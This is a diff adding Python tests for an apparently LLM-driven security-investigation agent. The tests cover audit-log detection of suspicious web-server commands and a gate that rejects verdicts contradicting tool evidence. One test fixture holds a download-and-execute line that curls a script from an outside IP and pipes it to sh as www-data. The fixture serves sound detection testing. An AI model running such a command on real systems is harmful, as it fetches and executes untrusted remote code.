@@ -278,7 +278,7 @@ def test_audit_event_type_accepts_record_type_and_zero_hint():
     assert not _event_type_matches(record, "identity")
 
     assert "필터 없이 보면 이벤트가 4건" in filtered_out_hint(4, {"event_type": "x", "ppid": None}, ("event_type", "ppid"))
-    assert filtered_out_hint(0, {"event_type": "x"}, ("event_type",)) == ""
+    assert "로그 기록 자체가 없습니다" in filtered_out_hint(0, {"event_type": "x"}, ("event_type",))
     assert filtered_out_hint(4, {}, ("event_type",)) == ""
 
 
@@ -336,6 +336,55 @@ def test_false_positive_rejected_when_principle9_met():
     result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(seed)
     assert result["final_verdict"]["verdict"] == "FALSE_POSITIVE"
     assert any(n.startswith("⚠ 판정-원칙 불일치") for n in result["investigation_notes"])
+
+
+def test_audit_rule_check_counts_whole_result_not_page():
+    """웹 서버 계정의 의심 명령은 페이지(limit)와 무관하게 전체 기준으로 센다."""
+    from agent.tools.real.fetch_audit_log import audit_rule_check, _audit_stats
+
+    noise = [{"user": "root", "comm": "systemctl", "exec_args": "systemctl status cron", "raw_ref": f"a:{i}",
+              "timestamp": "2026-09-22T13:45:51Z"} for i in range(300)]
+    shell = [{"user": "www-data", "comm": "sh", "exec_args": "sh -c curl -s http://203.0.113.50/x.sh | sh",
+              "raw_ref": "a:999", "timestamp": "2026-09-22T13:45:52Z"}]
+    check = audit_rule_check(noise + shell)
+    assert check["web_server_exec"] == 1 and check["web_server_suspicious"] == 1
+    assert "www-data: sh -c curl" in check["examples"][0]
+    text = _audit_stats(noise + shell, check)
+    assert "웹 서버 계정(www-data/apache/nginx/http) 실행 1건 중 의심 명령 1건" in text
+    assert audit_rule_check(noise)["web_server_suspicious"] == 0
+
+
+def test_gate_rejects_verdicts_contradicting_tool_facts():
+    """로그 미확보면 INCONCLUSIVE만, 웹 서버 계정 의심 명령이 있으면 TC·HIGH 이상만 승인."""
+    def empty(_args):
+        return {"count": 0, "summary": "0건", "records": [], "window_total": 0}
+
+    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_web_log": empty, "fetch_auth_log": empty,
+                                                "fetch_network_log": empty, "fetch_audit_log": empty})
+    fp = _terminate("no_more_evidence")
+    fp["final_verdict"] = {**fp["final_verdict"], "verdict": "FALSE_POSITIVE"}
+    inc = _terminate("no_more_evidence")
+    inc["final_verdict"] = {**inc["final_verdict"], "verdict": "INCONCLUSIVE"}
+    llm = RecordingLLM([_call("fetch_web_log"), _call("fetch_auth_log"), fp, inc])
+    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(SEED)
+    assert result["final_verdict"]["verdict"] == "INCONCLUSIVE"
+    assert any("로그 미확보" in n for n in result["investigation_notes"] if "종료 관문" in n)
+
+    def audit_with_shell(_args):
+        return {"count": 1, "summary": "audit", "records": [], "window_total": 300, "rule_checks": [{
+            "rule": "audit_post_exploitation", "web_server_exec": 1, "web_server_suspicious": 1, "suspicious": 1,
+            "examples": ["www-data: sh -c curl ... (audit.log:9)"]}]}
+
+    registry = build_default_registry(handlers={**MOCK_HANDLERS, "fetch_audit_log": audit_with_shell})
+    medium = _terminate("confidence_sufficient", 0.95)
+    medium["final_verdict"] = {**medium["final_verdict"], "severity": "MEDIUM"}
+    high = _terminate("confidence_sufficient", 0.95)
+    high["final_verdict"] = {**high["final_verdict"], "severity": "HIGH"}
+    llm = RecordingLLM([_call("fetch_web_log"), _call("fetch_audit_log"), medium, high])
+    result = InvestigationAgent(llm, registry, network_precheck=True, strict_termination=True).run(
+        {**SEED, "confidence_initial": 0.95})
+    assert result["final_verdict"]["severity"] == "HIGH"
+    assert any("웹 서버 계정의 의심 명령 실행 1건" in n for n in result["investigation_notes"])
 
 
 def test_confidence_sum_has_no_float_drift():
